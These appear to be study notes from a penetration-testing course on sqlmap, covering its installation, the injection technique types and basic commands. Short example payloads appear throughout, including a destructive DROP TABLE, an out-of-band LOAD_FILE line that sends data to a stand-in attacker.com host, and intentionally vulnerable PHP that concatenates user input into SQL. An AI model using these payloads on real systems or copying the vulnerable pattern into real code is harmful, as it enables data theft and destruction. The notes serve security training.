
## SQLMap Overview 

sqlmap is an open-source pen testing tool that automates the detection and exploitation of sql injection flaws 

`python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5`

contains options and switches for: 
- target connection 
- enumeration
- database content retrieval 
- injection detection 
- optimization
- file system access
- fingerprinting 
- protection detection and bypass using "tamper" scripts
- execution of the OS commands 

you can install with: 

`sudo apt install sqlmap`

manual installation: 

`git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev'

then you can run sqlmap with: 

`python sqlmap.py`

there are many supported databases: 

![](../Images/Pasted%20image%2020240105185232.png)

you can see the supported SQL injections with `sqlmap -hh`

BEUSTQ technique characters: 
- `B` = boolean-based blind 
- `E` = Error-based 
- `U` = union query-based 
- `S` = stacked queries 
- `T` = time-based blind 
- `Q` = inline queries

### Boolean-based blind SQL injection 

`AND 1=1`

sqlmap exploits boolean-based blind sql injection through the differentiation of TURE from FALSE query results   
retrieving 1 byte of info per request  
differentiation is based on server responses to see if it returned TRUE of FALSE   
could be from raw response content, HTTP codes, page titles, filtered text, etc. 

TRUE = generally based on responses having none or small difference to regular server response  
FALSE = substantial differences form regular server response  

boolean-based blind SQL injection is most common SQLi type in web apps 

### Error-based SQL injection 

`AND GTID_SUBSET(@@version,0)`

if the database management system (DBMS) errors are being returned in the server response then there is a chance that they can be used to carry the results for requested queries  
so you can target functions that cause known misbehaviors with specific payloads  

sqlmap has the biggest list of these payloads and covers error-based SQL injections for: 

- MySQL 
- microsoft SQL server 
- IBM DB2 
- PostgreSQL 
- Sybase 
- Firebird
- Oracle 
- Vertica
- MonetDB

error-based SQLi are considered to be the fastest, except for UNION query-based, because it can retrieve a limited amount of data called "chunks" through each request 

### UNION query-based

`UNION ALL SELECT 1, @@version,3`

using UNION makes is possible to extend the original (vulnerable) query with the injected statements' results   
attacker can get additional results from the injected statements within the page response itself  

considered the fastest because the attacker could pull the content of the entire database with a single request 

### Stacked queries 

`; DROP TABLE users`

stacking queries also known as piggy-backing is injecting additional SQL statements after the vulnerable one 

if there is a requirement for running non-query statements like INSERT, UPDATE, DELETE then stacking must be supported by the vulnerable platform (microsoft sql server and postgresql support by default) 

SQLmap can use such vulnerabilities to run non-query statements executed in advanced features like execution of OS commands and data retrieval like time-based blind sqli types

### Time-based blind SQL injection 

`AND 1=IF(2>1,SLEEP(5),0)`

similar to boolean-based blind sql injection but the response time is used as the source for the differentiation between TRUE and FALSE 

TRUE = noticeable difference between response time of regular server response  
FALSE = response time indistinguishable from regular response times 

much slower than boolean-based sqli since TRUE queries would delay the server response  
usually used when boolean-based is not applicable  
for example, when statement is a non-query 

### Inline queries 

`SELECT (SELECT @@version) from`

embeds a query within the original query  
uncommon because it requires the web app to be written in a certain way  

### Out-of-band SQL injection 

`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`

one of the most advanced types of sqli  
used in cases where all other types are either unsupported or too slow  
sqlmap supports these through DNS exfiltration where requested queries are retrieved through DNS traffic  

running sqlmap on the dns server for the domain under control (.attacker.com) allows sqlmap to perform the attack by forcing the server to request non-existent subdomains (foo.attacker.com) where foo would be the SQL response we want  
sqlmap collects the erroring DNS requests and collects the foo part to form the entire sql response 

## Getting Started with SQLMap 

in a simple scenario, there is a web page that accepts user input via a GET parameter (ex: id)  
you want to test if the web page is affected by a SQL injection  
if so then you will want to exploit it and get as much info as you can  
possibly even try to access the underlying file system and execute OS commands 

some vulnerable php code could look like: 

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

there will be an error reported as part of the web-server response in case of any sql query problems  
these will make SQLi detection easier

basic command on a url would look like: 

`sqlmap -u "http://www.example.com/vuln.php?id=1 --batch`

